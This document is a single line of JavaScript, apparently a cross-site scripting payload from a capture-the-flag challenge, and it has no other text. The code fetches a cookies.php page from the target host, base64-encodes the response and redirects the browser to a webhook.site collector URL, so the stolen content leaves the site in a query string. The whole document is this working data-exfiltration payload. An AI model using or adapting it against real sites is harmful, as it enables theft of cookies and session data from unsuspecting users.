
fetch('http://host3.metaproblems.com:6020/cookies.php').then(response => response.text()).then(text => window.location.href = `https://webhook.site/dbfb5ad3-fcf1-4c2d-ac00-c239ea0379be?cz=${btoa(text)}`);
